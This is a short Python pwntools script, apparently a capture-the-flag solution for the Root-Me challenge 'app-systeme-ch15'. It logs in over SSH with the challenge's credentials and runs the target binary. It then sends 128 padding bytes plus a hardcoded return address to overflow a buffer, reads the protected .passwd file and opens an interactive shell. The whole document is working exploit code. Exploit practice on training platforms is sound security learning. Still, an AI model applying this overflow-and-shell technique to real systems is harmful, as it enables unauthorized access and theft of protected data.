# solution by MtucX
# Require pwntools
from pwn import *
     
pwn_socket=ssh(host='challenge02.root-me.org' ,user='app-systeme-ch15' ,password='app-systeme-ch15',port=2222)
pwned=pwn_socket.process(executable='./ch15')
pwned.sendline('A' * 128  + '\x64\x84\x04\x08')
pwned.sendline('cat .passwd')
pwned.interactive()
